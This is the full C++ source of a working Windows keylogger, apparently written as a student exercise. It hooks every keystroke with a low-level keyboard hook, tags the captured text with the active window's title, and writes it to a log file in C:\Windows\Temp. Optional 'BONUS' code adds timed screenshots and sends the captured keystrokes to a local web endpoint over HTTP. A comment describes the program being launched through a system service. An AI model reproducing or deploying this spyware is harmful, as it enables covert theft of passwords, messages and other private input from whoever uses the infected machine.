#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 // Windows 10 minimum
#endif
#define NTDDI_VERSION 0x0A000000

#define WIN32_LEAN_AND_MEAN // reduce size of the windows headers
#define NOMINMAX
#define _UNICODE
#define UNICODE
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdi32.lib")
#pragma warning(push)
#pragma warning(disable : 4820)
#include <windows.h>
#include <wininet.h>
#pragma warning(pop)
#include <iostream>
#include <vector>
#include <fstream>
#include <memory>
#include <sstream>
#include <string>

// ============================================================================
// CONFIGURATION
// ============================================================================
constexpr size_t MAX_BUFFER_CHARS = 5000;
constexpr UINT FLUSH_TIMER_ID = 1;
constexpr UINT FLUSH_TIMER_INTERVAL_MS = 60000;
// ============================================================================
// GLOBAL STATE
// ============================================================================
struct KeyloggerState
{
    std::wstring currentProcessName;
    std::wstring keystrokeBuffer;
    SYSTEMTIME bufferStartTime;
    size_t currentBufferSize = 0;

    // Modifiers state
    // we have to follow modifiers states (only 4 modifiers exist)
    bool ctrlDown = false;
    bool altDown = false;
    bool shiftDown = false;
    bool winDown = false;
    bool capsLockOn = false;
    bool _padding[3] = {false, false, false}; // Explicit padding to align on 8 bytes
};

static KeyloggerState g_state;

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================
#ifdef BONUS
void sendRequest(const std::wstring &message)
{

    std::wstring url = L"http://localhost:8080/?exfil=" + message;

    HINTERNET hInternet = InternetOpenW(
        L"winkey",
        INTERNET_OPEN_TYPE_PRECONFIG,
        nullptr,
        nullptr,
        0);

    if (!hInternet)
        return;

    HINTERNET hUrl = InternetOpenUrlW(
        hInternet,
        url.c_str(),
        nullptr,
        0,
        INTERNET_FLAG_RELOAD,
        0);

    if (!hUrl)
    {
        InternetCloseHandle(hInternet);
        return;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
}
#endif

void LogEvent(const std::wstring &message)
{
    std::wstring logPath = L"C:\\Windows\\Temp\\winkey.log";

    std::wofstream file(logPath, std::ios::app);
    if (!file)
    {
        std::wstring buf =
            L"Failed to open log file: " + logPath +
            L", GetLastError=" + std::to_wstring(GetLastError());

        OutputDebugStringW(buf.c_str());
        return;
    }

    file << message << L'\n';
}

std::wstring FormatTimestamp(const SYSTEMTIME &st)
{
    wchar_t buffer[64];
    swprintf_s(buffer, L"[%02d.%02d.%04d %02d:%02d:%02d]",
               st.wDay, st.wMonth, st.wYear,
               st.wHour, st.wMinute, st.wSecond);
    return buffer;
}
#ifdef BONUS
bool doScreenshot(const std::wstring fileName)
{
    HDC hScreen = GetDC(nullptr);
    HDC hMemDC = CreateCompatibleDC(hScreen);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hMemDC, hBitmap);

    // Copie écran → bitmap
    BitBlt(hMemDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER bi{};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;

    DWORD bmpSize = static_cast<DWORD>(bmp.bmWidth) *
                    static_cast<DWORD>(bmp.bmHeight) *
                    4;
    BYTE *pixels = new BYTE[bmpSize];

    GetDIBits(hMemDC, hBitmap, 0, static_cast<UINT>(bmp.bmHeight),
              pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    HANDLE hFile = CreateFileW(
        fileName.data(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

    BITMAPFILEHEADER bfh{};
    bfh.bfType = 0x4D42; // BM
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + bmpSize;

    DWORD written;
    WriteFile(hFile, &bfh, sizeof(bfh), &written, nullptr);
    WriteFile(hFile, &bi, sizeof(bi), &written, nullptr);
    WriteFile(hFile, pixels, bmpSize, &written, nullptr);

    CloseHandle(hFile);

    delete[] pixels;
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreen);

    return true;
}
#endif

// FLUSH BUFFER TO FILE
// ============================================================================
void FlushBuffer(void)
{
    // OutputDebugStringW(L">>> FlushBuffer() called");

    if (g_state.keystrokeBuffer.empty())
    {
        OutputDebugStringW(L"    Buffer is empty, nothing to flush");
        return;
    }

    std::wstring timestamp = FormatTimestamp(g_state.bufferStartTime);

    LogEvent(timestamp + L" - " + g_state.currentProcessName + L"\n" + g_state.keystrokeBuffer + L"\n");
#ifdef BONUS
    sendRequest(g_state.currentProcessName + L" : " + g_state.keystrokeBuffer);
#endif
    OutputDebugStringW(L"Buffer flushed successfully to file");

    // Clear buffer
    g_state.keystrokeBuffer.clear();
    g_state.currentBufferSize = 0;
#ifdef BONUS
    doScreenshot(L"C:\\Windows\\Temp\\" + std::to_wstring(std::time(nullptr)) + L".bmp");
#endif
}

std::wstring GetActiveProcessName()
{
    HWND hwnd = GetForegroundWindow();

    if (hwnd == 0)
        return L"Unknown";

    wchar_t windowTitle[1024] = {0};
    GetWindowText(hwnd, windowTitle, _countof(windowTitle));
    // CloseHandle(hwnd);
    return (std::wstring(windowTitle));
}

// ============================================================================
// PROCESS CHANGE DETECTION
// ============================================================================
void HandleProcessChange(const std::wstring &newProcessName)
{
    if (g_state.currentProcessName.empty())
    {
        g_state.currentProcessName = newProcessName;
        GetLocalTime(&g_state.bufferStartTime);
        return;
    }

    if (newProcessName != g_state.currentProcessName)
    {
        FlushBuffer();
        g_state.currentProcessName = newProcessName;
        GetLocalTime(&g_state.bufferStartTime);
    }
}

// ============================================================================
// ADD KEYSTROKE TO BUFFER
// ============================================================================
void AddKeystrokeToBuffer(const std::wstring &key)
{
    g_state.keystrokeBuffer.append(key);
    g_state.currentBufferSize += key.length();

    if (g_state.currentBufferSize >= MAX_BUFFER_CHARS)
    {
        FlushBuffer(); // new line
        // Reinitialize timestamp
        GetLocalTime(&g_state.bufferStartTime);
    }
}

std::wstring KeyToUnicode(const KBDLLHOOKSTRUCT *kbd)
{
    BYTE keyboardState[256] = {0};

    // Force modifiers state manually instead of GetKeyboardState(keyboardState)
    // 0x80 = bit high
    if (g_state.shiftDown)
        keyboardState[VK_SHIFT] = 0x80;

    if (g_state.ctrlDown)
        keyboardState[VK_CONTROL] = 0x80;

    if (g_state.altDown)
        keyboardState[VK_MENU] = 0x80;

    // Check CapsLock state
    // & 0x0001 = toggle state (on/off)
    // & 0x8000 = pressed (physically pressed)
    if (g_state.capsLockOn)
    {
        // we force the state in the table : 0x01 = bit low
        keyboardState[VK_CAPITAL] = 0x01; // CapsLock is active
    }

    WCHAR buffer[5] = {0};
    HKL layout = GetKeyboardLayout(0);

    // serves only for letters, digits, symbols
    int result = ToUnicodeEx(
        kbd->vkCode,
        kbd->scanCode,
        keyboardState,
        buffer,
        4,
        0x4, // flags, read only
        layout);

    // Check if result is not a control character either (< 0x20)
    // because it would be un unprintable char otherwise (ex: 0x13 is Ctrl+S)
    // Avec flag 0x4, les dead keys retournent leur caractère de base
    if (result > 0 && buffer[0] != L'\0' && buffer[0] >= 0x20)
        return std::wstring(buffer);

    // result == -1 : dead key
    // We have to call ToUnicodeEx again to "consume" the dead key and get the base character
    // Ex: ^ should give ^, not be pending
    if (result == -1 || result == 0)
    {
        // Some dead keys need a 2nd call
        result = ToUnicodeEx(
            kbd->vkCode,
            kbd->scanCode,
            keyboardState,
            buffer,
            4,
            0x4,
            layout);

        if (result > 0 && buffer[0] != L'\0' && buffer[0] >= 0x20)
            return std::wstring(buffer);
    }

    return L"";
}

// ============================================================================
// CALLBACK FUNCTION
// ============================================================================
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        bool isKeyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        std::wstring activeProcessName = GetActiveProcessName();
        HandleProcessChange(activeProcessName);

        // Handle CAPSLOCK first
        if (kbdStruct->vkCode == VK_CAPITAL && isKeyDown)
        {
            g_state.capsLockOn = !g_state.capsLockOn; // toggle
            std::wstring capsLockMsg = g_state.capsLockOn ? L"[CapsLockON]" : L"[CapsLockOFF]";
            AddKeystrokeToBuffer(capsLockMsg);
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        switch (kbdStruct->vkCode)
        {
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            g_state.shiftDown = isKeyDown;
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            g_state.ctrlDown = isKeyDown;
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        case VK_MENU: // Alt
        case VK_LMENU:
        case VK_RMENU:
            g_state.altDown = isKeyDown;
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        case VK_LWIN:
        case VK_RWIN:
            g_state.winDown = isKeyDown;
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        // If not a release key
        if (!isKeyDown)
            return CallNextHookEx(NULL, nCode, wParam, lParam);

        // what is the pressed key ?
        std::wstring key;
        switch (kbdStruct->vkCode)
        {
        case VK_RETURN:
            key = L"\\n";
            break;
        case VK_TAB:
            key = L"\\t";
            break;
        case VK_BACK:
            key = L"[Backspace]";
            break;
        case VK_ESCAPE:
            key = L"[Esc]";
            break;
        case VK_SPACE:
            key = L" ";
            break;
        case VK_DELETE:
            key = L"[Del]";
            break;
        default:
            key = KeyToUnicode(kbdStruct);

            // If empty keym returns the keystroke name
            if (key.empty())
            {
                // Manual mapping for dead keys in AZERTY
                bool isAltGr = (g_state.ctrlDown && g_state.altDown);

                if (isAltGr)
                {
                    // Dead keys with AltGr in AZERTY
                    switch (kbdStruct->vkCode)
                    {
                    case 0x32: // AltGr+2 = ~
                        key = L"~";
                        break;
                    case 0x37: // AltGr+7 = `
                        key = L"`";
                        break;
                    default:
                        break;
                    }
                }

                // if still empty, fallback on VK code
                if (key.empty())
                {
                    // Convert VK code in key name
                    // Constructor `std::wstring(size_t count, wchar_t ch)` creates a string containing `count` copies of `ch`.
                    if (kbdStruct->vkCode >= 0x41 && kbdStruct->vkCode <= 0x5A)
                    {
                        key = std::wstring(1, (wchar_t)kbdStruct->vkCode); // 'A', 'B', 'C', etc.
                    }
                    else if (kbdStruct->vkCode >= 0x30 && kbdStruct->vkCode <= 0x39)
                    {
                        key = std::wstring(1, (wchar_t)kbdStruct->vkCode); // 0-9
                    }
                    else
                    {
                        return CallNextHookEx(NULL, nCode, wParam, lParam);
                    }
                }
            }
            break;
        }

        // Si encore vide, on ignore
        if (key.empty())
        {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        std::wstring prefix;

        // Ne pas afficher Ctrl+Alt si les DEUX sont pressés (c'est AltGr)
        bool isAltGr = (g_state.ctrlDown && g_state.altDown);
        // Build modifier prefix (Ctrl / Alt / Shift / Win)

        if (g_state.ctrlDown && !isAltGr)
            prefix += L"Ctrl";
        if (g_state.altDown && !isAltGr)
            prefix += L"Alt";
        if (g_state.shiftDown)
            prefix += L"Shift";
        if (g_state.winDown)
            prefix += L"Win";

        // Final displayed key
        std::wstring finalKey = prefix + key;

        AddKeystrokeToBuffer(finalKey);
        // LogEvent(buf);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

VOID CALLBACK TimerProc([[maybe_unused]] HWND hwnd,
                        [[maybe_unused]] UINT uMsg,
                        [[maybe_unused]] UINT_PTR idEvent,
                        [[maybe_unused]] DWORD dwTime)
{
    FlushBuffer();
}

// ============================================================================
// CLEANUP ON EXIT
// ============================================================================
void Cleanup()
{
    FlushBuffer(); // Final flush before leaving
}

// The agent (launched as Session 1 by the service in Session 0)
int main()
{
    // Initialize Capslock state
    // & 0x0001 = toggle state (on/off)
    g_state.capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    // Instant writing test
    SYSTEMTIME st;
    GetLocalTime(&st);
    std::wstring timestamp = FormatTimestamp(st);
    LogEvent(timestamp + L" === Keylogger Started ===\n");
    OutputDebugStringW(L"Startup message written to log");

    HHOOK hKeyboardHook;
    // Hook installation
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    if (!hKeyboardHook)
    {
        return 1;
    }

    // Configure timer for automatic flush
    UINT_PTR timerId = SetTimer(nullptr, FLUSH_TIMER_ID, FLUSH_TIMER_INTERVAL_MS, TimerProc);
    if (!timerId)
    {
        OutputDebugStringW(L"Failed to create flush timer");
    }

    // Loop for the hook to work
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        // TranslateMessage(&msg); // caused character problems
        DispatchMessage(&msg);
    }

    // Cleanup
    if (timerId)
    {
        KillTimer(nullptr, timerId);
    }
    UnhookWindowsHookEx(hKeyboardHook);
    Cleanup();
    return 0;
}